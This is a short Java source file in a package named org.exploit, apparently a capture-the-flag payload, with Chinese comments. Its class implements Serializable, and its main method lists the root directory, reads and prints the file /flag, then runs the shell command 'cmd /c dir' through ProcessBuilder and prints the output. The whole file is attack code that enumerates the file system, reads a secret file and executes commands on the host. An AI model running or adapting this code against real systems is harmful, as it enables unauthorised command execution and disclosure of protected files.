package org.exploit;
import java.io.*;


public class test implements Serializable {
    public static void main(String[] args) throws IOException {
        java.nio.file.Path rootPath = java.nio.file.Paths.get("/").toAbsolutePath();
        java.nio.file.Path currentPath = java.nio.file.Paths.get("").toAbsolutePath();
        System.out.println("当前目录下的文件列表:");
        try (java.nio.file.DirectoryStream<java.nio.file.Path> stream = java.nio.file.Files.newDirectoryStream(rootPath)) {
            for (java.nio.file.Path file : stream) {
                System.out.println(file.getFileName());
            }
        } catch (Exception e) {
            System.err.println("读取目录时发生错误: " + e.getMessage());
        }
        // 输出当前路径
        System.out.println("当前路径: " + currentPath);
        java.nio.file.Path flagFilePath = java.nio.file.Paths.get("/flag");

        try {
            // 读取文件内容
            java.util.List<String> lines = java.nio.file.Files.readAllLines(flagFilePath);

            // 输出文件内容
            for (String line : lines) {
                System.out.println(line);
            }

        } catch (Exception e) {
            System.err.println("读取文件时发生错误: " + e.getMessage());
        }
        String[] command = { "cmd", "/c", "dir" };

        try {
            // 创建 ProcessBuilder 实例
            ProcessBuilder processBuilder = new ProcessBuilder(command);

            // 启动进程
            Process process = processBuilder.start();

            // 读取命令的输出
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            // 读取命令的错误输出
            java.io.BufferedReader errorReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getErrorStream()));
            String errorLine;
            while ((errorLine = errorReader.readLine()) != null) {
                System.err.println(errorLine);
            }

            // 等待命令执行完成
            int exitCode = process.waitFor();
            System.out.println("命令执行完成，退出码: " + exitCode);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}